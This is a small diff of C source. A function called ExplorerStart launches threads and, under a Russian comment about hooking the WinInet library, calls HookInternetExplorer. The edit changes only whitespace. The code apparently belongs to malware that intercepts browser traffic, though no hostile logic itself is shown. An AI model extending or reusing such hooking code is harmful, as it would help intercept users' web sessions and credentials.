@@ -39,9 +39,10 @@ void ExplorerStart(PEventData Data)
 		RunThreadBBS();
 	#endif
 
-	#ifdef		JAVS_PATCHERH
+	#ifdef JAVS_PATCHERH
 		StartThread(Run_Path,NULL);
 	#endif
+
 	// Хукаем библиотеку WinInet
 	#ifdef InternetExplorerH
 		HookInternetExplorer();
